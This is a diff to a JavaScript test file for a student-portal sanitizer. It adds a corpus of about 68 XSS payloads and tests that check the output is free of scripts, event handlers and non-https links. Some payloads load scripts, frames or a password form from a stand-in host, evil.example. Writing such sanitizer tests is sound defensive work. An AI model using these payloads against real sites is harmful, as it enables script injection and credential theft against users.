@@ -309,3 +309,114 @@ test("student portal escapes lesson content and coerces scores to numbers", () =
   assert.match(portal, /Number\(state\.progress\.scores\[/);
   assert.match(portal, /escapeHtml\(code\)/);
 });
+
+const xssCorpus = [
+  '<img src=x onerror=alert(1)>',
+  '<img src="x" onerror="alert(1)">',
+  '<IMG SRC=x ONERROR=alert(1)>',
+  '<img src=javascript:alert(1)>',
+  '<svg onload=alert(1)>',
+  '<svg><script>alert(1)</script></svg>',
+  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
+  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
+  '<script>alert(1)</script>',
+  '<ScRiPt>alert(1)</sCrIpT>',
+  '<script src=https://evil.example/x.js></script>',
+  '<scr<script>ipt>alert(1)</scr</script>ipt>',
+  '<a href="javascript:alert(1)">x</a>',
+  '<a href="JaVaScRiPt:alert(1)">x</a>',
+  '<a href="java\tscript:alert(1)">x</a>',
+  '<a href="java&#x0A;script:alert(1)">x</a>',
+  '<a href="&#106;avascript:alert(1)">x</a>',
+  '<a href=" javascript:alert(1)">x</a>',
+  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
+  '<a href="vbscript:msgbox(1)">x</a>',
+  '<a href="//evil.example/phish">x</a>',
+  '<a href="http://evil.example/">x</a>',
+  '<a href="https://ok.example/" onclick="alert(1)">x</a>',
+  '<a href="https://ok.example/" style="position:fixed;inset:0">x</a>',
+  '<iframe src="https://evil.example"></iframe>',
+  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
+  '<object data="https://evil.example/x.swf"></object>',
+  '<embed src="https://evil.example/x.swf">',
+  '<form action="https://evil.example"><input name=password><button>go</button></form>',
+  '<input autofocus onfocus=alert(1)>',
+  '<select autofocus onfocus=alert(1)><option>1</option></select>',
+  '<textarea autofocus onfocus=alert(1)></textarea>',
+  '<button onclick="alert(1)">x</button>',
+  '<button formaction="javascript:alert(1)">x</button>',
+  '<div style="background:url(javascript:alert(1))">x</div>',
+  '<div style="width:expression(alert(1))">x</div>',
+  '<style>@import "https://evil.example/x.css";</style>',
+  '<style>*{display:none}</style>',
+  '<link rel=stylesheet href=https://evil.example/x.css>',
+  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+  '<base href="https://evil.example/">',
+  '<body onload=alert(1)>',
+  '<details open ontoggle=alert(1)>x</details>',
+  '<video><source onerror=alert(1)></video>',
+  '<audio src=x onerror=alert(1)></audio>',
+  '<marquee onstart=alert(1)>x</marquee>',
+  '<p onmouseover="alert(1)">hover</p>',
+  '<span data-vocab="x" onmouseenter="alert(1)">x</span>',
+  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
+  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
+  '<svg><style><img src=x onerror=alert(1)></style></svg>',
+  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
+  '<table><caption><img src=x onerror=alert(1)></caption></table>',
+  '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>',
+  '<p>&#60;script&#62;alert(1)&#60;/script&#62;</p>',
+  '<img src="x" alt="&quot; onerror=&quot;alert(1)">',
+  '<img src=x alt=`onerror=alert(1)`>',
+  '<a href="https://ok.example/"><img src=x onerror=alert(1)></a>',
+  '<\u0000script>alert(1)</script>',
+  '<img src=x onerror\u0000=alert(1)>',
+  '<scrİpt>alert(1)</scrİpt>',
+  '＜script＞alert(1)＜/script＞',
+  '<img src="https://ok.example/x.png" loading=lazy onload=alert(1)>',
+  '<div><div><div><div><img src=x onerror=alert(1)></div></div></div></div>',
+  '<p><b><i><p>nested</b></i> malformed <img src=x onerror=alert(1)>',
+  '<!--><img src=x onerror=alert(1)>-->',
+  '<![CDATA[<img src=x onerror=alert(1)>]]>',
+  '<?xml version="1.0"?><img src=x onerror=alert(1)>'
+];
+
+const forbiddenElements = "script, iframe, object, embed, svg, math, style, link, meta, base, form, input, select, textarea, video, audio, source, noscript, marquee, details";
+
+function assertSafeOutput(markup, payload) {
+  const output = new JSDOM(`<body>${markup}</body>`, { url: "https://example.test/" }).window.document;
+  assert.equal(output.querySelectorAll(forbiddenElements).length, 0, `forbidden element survived: ${payload}`);
+  for (const element of output.querySelectorAll("*")) {
+    for (const attribute of element.attributes) {
+      assert.doesNotMatch(attribute.name, /^on/i, `event handler survived: ${payload}`);
+      assert.notEqual(attribute.name, "style", `style attribute survived: ${payload}`);
+      assert.notEqual(attribute.name, "srcdoc", `srcdoc survived: ${payload}`);
+      assert.notEqual(attribute.name, "formaction", `formaction survived: ${payload}`);
+      if (["href", "src"].includes(attribute.name)) {
+        const resolved = new URL(attribute.value, "https://example.test/");
+        assert.equal(resolved.protocol, "https:", `non-https URL survived: ${payload}`);
+      }
+    }
+  }
+}
+
+test("sanitizer neutralises an XSS corpus of 60+ payloads and is idempotent (no mutation XSS)", () => {
+  assert.ok(xssCorpus.length >= 60, "corpus should contain at least 60 payloads");
+  const dom = new JSDOM("<!doctype html><body></body>", { url: "https://example.test/" });
+  const sanitize = createSanitizer(dom);
+  for (const payload of xssCorpus) {
+    const once = sanitize(payload);
+    assertSafeOutput(once, payload);
+    const twice = sanitize(once);
+    assert.equal(twice, once, `sanitizer output must be stable under re-parsing: ${payload}`);
+  }
+});
+
+test("sanitizer keeps benign teacher markup", () => {
+  const dom = new JSDOM("<!doctype html><body></body>", { url: "https://example.test/" });
+  const sanitize = createSanitizer(dom);
+  const output = sanitize('<p>She <strong>has</strong> <span class="v-word" data-vocab="run">run</span> <a href="https://ok.example/x">link</a></p>');
+  assert.match(output, /<strong>has<\/strong>/);
+  assert.match(output, /data-vocab="run"/);
+  assert.match(output, /href="https:\/\/ok\.example\/x"/);
+});
